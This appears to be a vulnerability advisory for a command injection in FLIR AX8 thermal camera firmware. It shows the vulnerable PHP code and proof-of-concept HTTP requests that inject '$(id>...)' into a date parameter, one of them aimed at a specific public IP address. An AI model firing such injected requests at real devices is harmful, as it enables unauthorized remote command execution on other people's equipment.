# `$hour` parameter in the file `settingsregional.php ` has a Remote Command Injection

### Description

In FLIR AX8 up to 1.46.16, The  parameter **$hour** in `setDataTime` function in the file `\usr\www\application\models\settingsregional.php`  has a Remote Command Injection vulnerablilty .

`\usr\www\application\models\settingsregional.php`

```php
public function setDateTime($year, $month, $day, $hour, $minute)
{
    shell_exec(sprintf('timedatectl set-time "%s-%s-%s %s:%s"',
        $year,
        $month,
        $day,
        $hour,
        $minute
    ));
}
```

### POC

```
POST /settings/setDateTime/2024/1/22/10$(id>test.txt)/12 HTTP/1.1
Host: XXXXXXX
```

### Example 

```
POST /settings/setDateTime/2025/3/15/10/11$(id>test32.txt) HTTP/1.1
Host: 222.103.211.89:8004
```

![image-20250317211558890](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172115142.png)

![image-20250317205454041](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172116920.png)